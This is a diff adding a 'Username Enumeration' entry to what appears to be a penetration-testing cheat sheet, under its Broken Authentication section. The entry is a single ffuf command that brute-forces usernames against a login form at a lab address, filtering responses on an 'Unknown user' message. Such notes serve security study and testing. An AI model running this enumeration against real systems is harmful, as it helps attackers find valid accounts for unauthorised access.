@@ -1096,6 +1096,12 @@ $ cupp -l
 #18. - Broken Authentication
 -----------------------------------------
 
+- Username Enumeration
+
+```
+$ ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
+```
+
 #19. - Sensitive Data Exposure
 -----------------------------------------
 
